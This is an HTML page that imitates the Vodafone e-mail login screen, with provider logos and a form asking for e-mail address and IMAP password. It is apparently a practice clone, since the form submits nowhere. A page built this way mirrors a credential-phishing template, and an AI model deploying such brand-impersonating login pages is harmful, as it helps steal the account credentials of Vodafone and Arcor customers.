<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <div class="page-box">
        <header class="logos">
            <div class="accor-logo">
                <img src="image/accor-logo.jpg" width="80%">
            </div>
            <div class="accor-mark">
                <img src="image/accor-mark.jpg" width="50%">
            </div>
            <div class="mail">
                <img src="image/mail.jpg" width="50%">
            </div>
            <div class="vodafone">
                <img src="image/vodafone.jpg" width="80%">
            </div>
        </header>
        <main>
            <p style="text-align: left; font-size: small; padding-left: 10px; ">Vodafone E-Mail & Cloud</p>
            <P class="log ">Login mit E-Mail Zugangsdaten</P>
            <p>Für Deine E-Mail-Konten bei Vodafone, Arcor, Kabel Deutschland und Unitymedia.</p>

            <section>
                <form>
                    <div>
                        <input type="text " placeholder=" E-mail-Adresse " name="E-mail " required class="Email ">
                    </div>
                    <div>
                        <input type="text " placeholder=" E-Mail-Passwort " id="passwort " name="Passwort " required class="passwort ">
                        <label for="passwort ">Trag hier Dein E-Mail-/ IMAP-Passwort ein</label>
                    </div>
                    <div>
                        <input type="submit " value="Login " class="submit ">
                    </div>
                </form>
            </section>
        </main>
        <footer></footer>
    </div>
</body>

</html>
